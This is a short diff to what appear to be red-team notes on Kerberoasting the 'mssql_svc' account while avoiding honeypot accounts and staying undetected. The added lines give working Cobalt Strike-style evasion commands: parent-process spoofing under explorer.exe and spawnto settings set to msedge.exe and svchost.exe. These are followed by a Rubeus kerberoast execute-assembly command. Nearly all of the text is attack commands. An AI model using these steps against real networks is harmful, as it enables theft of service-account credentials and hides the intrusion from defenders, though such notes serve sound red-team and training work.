@@ -15,6 +15,12 @@ ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=
 >Obtain HASH value for only `mssql_svc` target account and not triggering the honeypot accounts, remaining undetected.  
 
 ```sh
+ppid 8276   //  (explorer.exe) → good parent for the sacrificial process
+
+spawnto x64 C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
+ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
+// DO NOT override spawnto again before execute-assembly
+
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
 ```  
 
